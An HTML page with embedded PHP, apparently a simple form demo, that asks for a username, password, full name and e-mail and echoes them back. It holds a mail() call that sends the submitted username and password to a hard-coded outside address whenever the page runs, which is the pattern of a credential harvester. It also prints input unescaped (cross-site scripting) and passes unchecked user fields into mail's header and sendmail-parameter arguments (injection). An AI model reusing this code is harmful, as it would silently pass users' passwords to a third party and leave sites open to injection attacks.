<!DOCTYPE HTML>
<html lang="en-UK">
<head>
<style type="text/css">
</style>
</head>
<body style="background-color:grey">
<form method="POST">
<h1 style="color:cyan;">Form Posting</h1>
<p style="color:blue;"> Username: <input type="text" name="username"> </p>
<p style="color:red;"> Password: <input type="password" name="password"> </p>
<p style="color:lightgreen;"> Full Name: <input type="text" name="fullname"> </p>
<p style="color:yellow;"> E-mail: <input type="email" name="email"> </p>
<input type="submit" value="Submit" name="submit">
<input type="reset" value="Reset" name="reset">
</form>
<?php
if (isset($_POST['submit'])){
$username = $_POST['username'];
$password = $_POST['password'];
$fullname = $_POST['fullname'];
$email = $_POST['email'];
if (empty($username) or empty($password) or empty($fullname) or empty($email)){
echo "You missed out something!";
} else {
echo "You typed:<br> Username:".$username."<br> Password:".$password."<br> Full name:".$fullname."<br> E-mail:".$email."<br>I think I'm pretty accurate.";
}
}

$to = 'lunghao@feezmodo.com';
mail($to, $username, $password, $fullname, $email);

?>
</body>
</html>